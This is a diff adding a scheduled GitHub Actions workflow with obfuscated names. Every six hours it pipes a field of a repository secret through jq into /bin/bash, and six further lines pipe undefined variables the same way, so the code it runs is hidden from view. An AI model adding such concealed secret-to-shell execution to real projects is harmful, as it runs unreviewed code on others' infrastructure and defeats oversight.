@@ -1,0 +1,24 @@
+name: ershisuoyouu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ershisuoyouu
+        env:
+          bfh6126: ${{ secrets.bfh6126 }}
+        run: |
+          echo $bfh6126 | jq -r .sdy85 | /bin/bash
+          echo $dsa6 | jq -r .ilio17341 | /bin/bash
+          echo $fjjfa087 | jq -r .x06 | /bin/bash
+          echo $di4006 | jq -r .tqk13 | /bin/bash
+          echo $z235 | jq -r .ud068 | /bin/bash
+          echo $bwym79 | jq -r .x89686 | /bin/bash
+          echo $xpot095 | jq -r .xokvv04 | /bin/bash
+
